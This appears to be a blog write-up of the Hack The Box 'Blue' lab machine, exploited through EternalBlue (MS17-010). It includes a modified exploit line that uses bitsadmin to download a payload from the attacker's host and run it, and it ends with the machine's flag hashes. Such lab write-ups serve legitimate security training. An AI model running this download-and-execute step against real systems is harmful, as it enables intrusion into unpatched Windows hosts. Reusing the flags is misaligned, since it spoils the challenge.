---
layout: post
title:  "HTB Blue Windows"
description : Easy machine, Ethernalblue exploit and metasploit is all what is needed
tags: HTB, msfvenom, python
---

# HTB BLue

# Recon
Nmap scan
```ruby
nmap/Vulns_10.10.10.40.nmap 10.10.10.40
Nmap scan report for 10.10.10.40
Host is up (0.044s latency).

PORT      STATE SERVICE      VERSION
135/tcp   open  msrpc        Microsoft Windows RPC
139/tcp   open  netbios-ssn  Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds Microsoft Windows 7 - 10 microsoft-ds (workgroup: WORKGROUP)
49152/tcp open  msrpc        Microsoft Windows RPC
Service Info: Host: HARIS-PC; OS: Windows; CPE: cpe:/o:microsoft:windows
Host script results:
|_smb-vuln-ms10-054: false
|_smb-vuln-ms10-061: NT_STATUS_OBJECT_NAME_NOT_FOUND
| smb-vuln-ms17-010: 
|   VULNERABLE:
|   Remote Code Execution vulnerability in Microsoft SMBv1 servers (ms17-010)
|     State: VULNERABLE
|     IDs:  CVE:CVE-2017-0143
|     Risk factor: HIGH
|       A critical remote code execution vulnerability exists in Microsoft SMBv1
|        servers (ms17-010).
```
# Exploitation
The target machine is vulnerable to the infamous Ethernalblue exploit. 
First we gonna use the metasploit module `auxiliary/scanner/smb/pipe_auditor` so we can use a valid PIPE name from the SMB.
![](https://lh3.googleusercontent.com/0PKB1HI1YseEYeGKuxY6eiv8QtP0FJkw3utrndTzyql8LBnn_txCz-QWh-6bCkreyYR8HmNsbN2b7LlRFSzjyTH5Mmvbs9O6pjobhrJWktjDGryAYQK9Q-DBl9zwSMp6E1L796xTub9Ioh7bx3mRsW-YK6IEM0yR9wcun-rD3PSnucV7o9NPo0x0HRJgIKxWOFOx8T32mZ2GwVBK208TULyCONRmi485TjsAnawOL2B3gMvsyXSgGkuIGgoZzUq9rn1QjmLojcUQo7Djcm15_nCaLBtbz_6NlooIVBS9evdqXDVOMFHYOhC9dmMJPS8xYRWglqC6e4FYNulHCPQoJGtGPC-x10FUBFE-qE9tRqyM439K6NNfdxdmoVhK4YnSnEWsBrhU_zWohR7z03TKqT8QdhqrN91cvtrlZt1QQo6QMOmvXnXDc7nfUfgJiga7fLxp18FH7FeGYVixSoVC6IYOhog1ZTpGk6ITgX4SG7qNMgg7PxriGsoJoiZafpX1cT_d3B2zuA9VhSf1APwHLg_Z7luR0njhru2cZeYg023_cXRu_rqTmvJKxkRbcP0PkfxnS2tZqskY3BssuWsyyx0lgImf-PCFwsQigU90g_ANQ1atpDJUOUPuQOckKsBRSODnev6cTsd9rOH4cHT0Ro5IysdH6z-FqpYGREt4SfBXn-Z_09UFUqM=w1332-h176-no)

We download the EthernalBlue python exploit from **worawit**
```
wget https://raw.githubusercontent.com/worawit/MS17-010/master/mysmb.py 
```
We create our shell using msfvenom
![](https://lh3.googleusercontent.com/e0kfHstDjnfrIWY5JcTvFAwefzj-Yg146bBHiq6jkOWc7GcJEYMFSAkUmUFQb9LEWNvDzyOsfByt-HFjsnAv_IYEbHI4Yba-4Gpqz2kUd_IJEvhJbs-iTxgY-aZk6EnRW29WALCRWD1I-at-MhVzvehpTNUuSwACpLK-Bo9q8RFUPpt04iXqVV1H1ajoemMRgsg_Aj0jJXr8olg6MeX_aqk2og9aLHmj5pAeC41bzja1Y47aaD_S7xKmJj66_vduTjPL-f8-zhOUFvH44snmXlkAzbria3o-9jLMFCGrxhK0LXMH8YMKgoN8TtTtAGho-8gEiSEjVvs0MrO5hmHEwD9RRuV2SI9MGNHfG0yH4kF8lHD8z9dP35WC5B7HTYgTKBXiAgiEItbriaDd4L36aTleCpclM7ik9aOwoizTIy8-XQUGhk0JgtAXlCfboQoclZjsfO4x60smJDmqttClXWRfXgd8btaAW7QCLHJ5zmdiimsSDazRXO0BMhwsMociCl6Yxs5RVf5oWJPxvXtb4hdb89wlCMHJg2m9hHOqrCFeMF_4iaM-cyNY6OfkyW2rfO0IcuxBxUBNKJEGBdxqBhEaYgKZ-GLucyfLxzL7d-jcV5f5e3x5JBr4fucV9wCr8gp8TB8q_9ZBLqrz9veNYPN02BCK1JRCrnkM_FU326PusQ2qgnExr8s=w1341-h248-no)

We modified the exploit to call for our payload to be donwloaded on our target machine

```ruby
#smb_send_file(smbConn, sys.argv[0], 'C', '/exploit.py')
	service_exec(conn, r'cmd /c bitsadmin /transfer pwn /download http://10.10.14.14/sc.exe C:\sc.exe')
        service_exec(conn, r'cmd /c /sc.exe')
	# Note: there are many methods to get shell over SMB admin session
	# a simple method to get shell (but easily to be detected by AV) is
	# executing binary generated by "msfvenom -f exe-service ..."
  ```
  
We run the exploit along with a valid PIPE to use and our payload is executed
![](https://lh3.googleusercontent.com/BMpjy9RPHcyQV9UQEpeJGAzKjRn3oTPhLyF3jZbp_MaC3ZYpfZjHEAlFzb9kzoRg7JDLxTYysPW17FubtYTxyngbO-ZvUyWxWKK2vlT7eVO2T0kPywpkCAhsH1kLXK1Xuum2hXsKtAFofZTzBJIgBwKLGU9QArHcaN9BhOVkdVHADy9rqqBNMdWWws2TjRCwuP1IZGSXqYnWHH5a3rzKyboFL03rJL6LqAEE5qKRiK0v812BxRcK6LfCS7J-XJMgG4s0snBTGsoPgss9KcEWxbKNa7plQtv18wTExP8SwkkJbO7V4c8CP7aiuHbMdR-Y-Gehy_4cihVKdZjzI0LjTzyOZM47NwAwpaNAJ5Zz1PNAX1UaUI1ubZ69_BpAB5U9eQ89FhZbx6Yf1DPURFQbQX1ZEltfX2Gd8ZwuIr02EmJLLpC4rqljqBqZ70gCFz669lZidurG2yKSJMeCaHfvd76guVJ-dyZLJSIK7TYYwZxO2C5zEFHeoQ6tEgavG5U70y-NeLdchHaUtzyuszlxV3b_hADqDmhnrRyWgVypT9mH6ZDLzlAsmYxG4L-B0KSXeBx0Bgr1VMLOvxgSCY8kE5O1qDotOVoWUn3NkAHq1CIlfdQaehk_yv-NZwQyKfnpE6J87xwCrer26Zvdc5Bhp6KIJ1ZAGzCb8pZ5-rSzuxgGe1QkFphM11s=w537-h464-no)

![](https://lh3.googleusercontent.com/qWP4JICNTD1mwhXK_J56RU6BpPxTHbP_QIEO3X2kzyF5vaCk6Qo_VxSi-Y6HUOImkgeRY_VyRcmycfuUXF10Vbz3kVeGohsBWdI6B72Ara0nuK6Bc9B9vXlew4wwKKqjEYpphpQFpM3n9oMtwIgrgd0gToBF2gXVARYXXAMFJ9XSD8uEG45crUInDuBn6WGFmFFIi3UVhMAmqmOldH685UT-FyYN4JeJzTuYOay5PKmwiYQ2vo-qqWWpJvsA2MCoCMCR6fFttbjqgTGV-k37fx2cWtD3wWzEOefodCAG2GrZ8VtvZjAdsAfJqUijVqWF5WU_YxHiwnxFWMQqgnctXoqGnx0xfOs2LnVqTRTD5ysQ2bJ4Qc3cHj29W1gUdU5y5qrAR8LSxTg-FHdULZGRvlX1sJ68igPyffb4J8pJ_bmaI78JIAvAVY53-BvFarM_Wzm3ubg8dcgrwt32rtOfhDHMwk1HAd8AJ0AWBEmq4IBzVGudBwqILdR0_tr_QL0N08G6K_CTcfRdOQGTkYQQJkqlN0jXsA_SlgE41fbTP9D07KjJc61zZa8NeWCWjXZUImchmHK2pJ1iPiUml8DshqFXGWjI71auMBbd9zIFEppATj9i8BXWJy8z5_f_Ew8q4l897Nx_smtg7NSZhnD5LTzbI38flAVMnDDt6m9u-Kb0vVFW74oaX2s=w1101-h458-no)

Finally we got Root level access.
![](https://lh3.googleusercontent.com/ZuFWg4MRj-bxX7daE4pDG6LaC8yHBO6LkhK9lKTogq-3zIU4pmU5qeL7EtXLAorU4Hoj726K_LkKQUw8_qexnzkYq0ti_jaspduSSamfXC5hX1v80Tt-1NpCi4LGUxaE607VHatFo5bVlQNRQri5L-G5IoZerYUIDgrDYK550eYCWfDB6kPn6uUAq00nIMp-G5BCwLkNcw2j5S1xcKJ_dddk5Mo_sEu7Uc6gnOO7oaAG3-2lquvUgk5r4huXPQhKz5-zVPiUPoqc5q-2-w1F5PFBLKnDMkT-XkF0wQyIuZy-4xhqAZZkpaw_XPIf7nQ6Rh6BXEmfxr336sw2tKCP1KcDvt8wFdLUnM5Oqf0cgiv80FDW2_sEYHDGhsBaTsGD37D0ESe_7ZuthcDYyH5eynB7kZE4VwvUd2fSE9e2duWuQebOpmsUuRPGkxlc97IpWKIJvNyUeH5H5SRAgGK-RlfxMqbuvdpllLeOrNfRsjzx897BR-iIqBvwJz2y04cHdOWR7mjsfefUCY_GeExlPCxwQIGsvLqwwdP8uC-81cYdXANuxTAIz4Ty18wBAQXRkHvZQkL9TyIgfuphRHy_xI1b7pfXzZog8f3n3vJm9MiHFfHHTLiGgIXBFztHztXN2rVi5NJx--CJv576xPiTzkV1wRH_r1VX-7vpY52FgJ0WQhLolq7RhNA=w1032-h393-no)

# Flags
```ruby
 ROOT "ff548eb71e920ff6c08843ce9df4e717"
 USER "4c546aea7dbee75cbd71de245c8deea9" 
```
